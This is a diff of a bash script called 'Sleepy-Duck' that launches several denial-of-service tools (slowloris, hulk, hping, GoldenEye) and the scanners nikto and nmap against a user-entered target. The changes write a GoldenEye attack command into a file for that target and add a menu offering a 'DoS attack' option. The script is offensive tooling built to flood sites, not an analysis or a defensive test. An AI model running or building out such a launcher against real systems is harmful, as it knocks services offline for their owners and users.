@@ -241,7 +241,7 @@ golden_eye()
   if [[ $eye == "Y" || $eye == "y" ]]; then
     cd tools/GoldenEye/
     touch attack_dos.txt
-    echo "python goldeneye.py https://" > attack_dos.txt
+    echo -n "python goldeneye.py https://" > attack_dos.txt
     cd ../..
     echo -n "$target" >> tools/GoldenEye/attack_dos.txt
     cd tools/GoldenEye
@@ -259,13 +259,21 @@ main()
   echo "Welcome to the Sleepy-Duck"
   echo "Let's find the target!!!"
   intro
-  #nmap
-  nikto
-  nmap
-  slowloris
-  hulk
-  hping
-  golden_eye
-  cat art/bye.txt
+  echo "What would you like to perform?"
+  echo "1) DoS attack"
+  echo "2) Vulnerability assessment"
+  echo "What would you like to do"
+  echo -n "༼(∩ ͡°╭͜ʖ╮͡ ͡°)༽⊃━☆ﾟ. * ･ ｡ﾟ    " ; read option
+  if [[ $option == "1" ]]; then
+    slowloris
+    hulk
+    hping
+    golden_eye
+  elif [[ $option == "2" ]]; then
+    nikto
+    nmap
+  else
+    cat art/bye.txt
+fi
 }
 main
